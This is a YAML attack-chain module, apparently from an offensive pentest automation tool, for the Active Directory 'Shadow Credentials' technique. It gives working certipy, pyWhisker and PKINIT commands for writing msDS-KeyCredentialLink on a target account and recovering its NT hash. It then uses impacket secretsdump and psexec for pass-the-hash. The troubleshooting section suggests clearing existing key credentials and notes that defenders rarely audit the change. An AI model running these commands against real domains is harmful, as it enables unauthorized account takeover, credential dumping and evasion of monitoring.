chain_id: shadow_credentials
title: "AD — Shadow Credentials (write msDS-KeyCredentialLink → PKINIT → NT hash)"
severity: HIGH
tags: [ad, kerberos, pkinit, shadow-credentials, msds-keycredentiallink, certipy, whisker]

trigger:
  any_of:
    - { banner_pattern: "(?i)active\\s*directory|ldap|kerberos" }
    - { service_pattern: "(?i)ldap|kerberos" }
    - { port_in: [88, 389, 636] }
    - { kind: "shadow_creds_candidate" }

description: |
  If you have `GenericAll` / `GenericWrite` /
  `WriteProperty(msDS-KeyCredentialLink)` on a target principal, you
  can append a public key to its `KeyCredentialLink` and then PKINIT
  with the matching private key. The DC returns a TGT plus the NT hash
  in PAC_CREDENTIAL_INFO — equivalent to a stealthy hash dump of that
  account. Bypasses MachineAccountQuota and works against users too.

steps:
  - id: 1
    title: "Find write rights from BloodHound"
    command: |
      bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns $DC_IP
      # Cypher:
      #   MATCH (a)-[:GenericAll|GenericWrite|WriteProperty]->(t)
      #   RETURN a.name, t.name

  - id: 2
    title: "Add a key credential with certipy"
    command: |
      certipy shadow auto -u USER@DOMAIN -p 'PASS' \
        -account 'TARGET' -dc-ip $DC_IP

  - id: 3
    title: "If certipy is unavailable: pyWhisker"
    command: |
      pywhisker -d DOMAIN -u USER -p 'PASS' --target TARGET \
        --action add --filename rootctl --dc-ip $DC_IP
      gettgtpkinit.py -cert-pfx rootctl.pfx -pfx-pass '<pwd>' \
        DOMAIN/TARGET TARGET.ccache

  - id: 4
    title: "Recover the NT hash from the returned PAC"
    command: |
      export KRB5CCNAME=TARGET.ccache
      getnthash.py -key <as_rep_session_key> DOMAIN/TARGET

  - id: 5
    title: "Use the hash — pass-the-hash everywhere"
    command: |
      impacket-secretsdump -hashes :<NT> DOMAIN/TARGET@DC.DOMAIN
      impacket-psexec -hashes :<NT> DOMAIN/TARGET@TARGET.DOMAIN

common_errors:
  - error: "PKINIT fails: KDC_ERR_CLIENT_NOT_TRUSTED"
    solution: |
      The DC has no enterprise CA the cert chains to. PKINIT requires
      a CA in NTAuthCertificates. Without it, this chain only works
      against forests where AD CS is deployed (which is most of them).
  - error: "shadow auto fails with 'too many keys'"
    solution: |
      Target already has the max key credentials — wipe an existing
      one with `certipy shadow clear` (you're modifying an
      attribute, defenders rarely audit this).

references:
  - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec
  - https://github.com/ly4k/Certipy
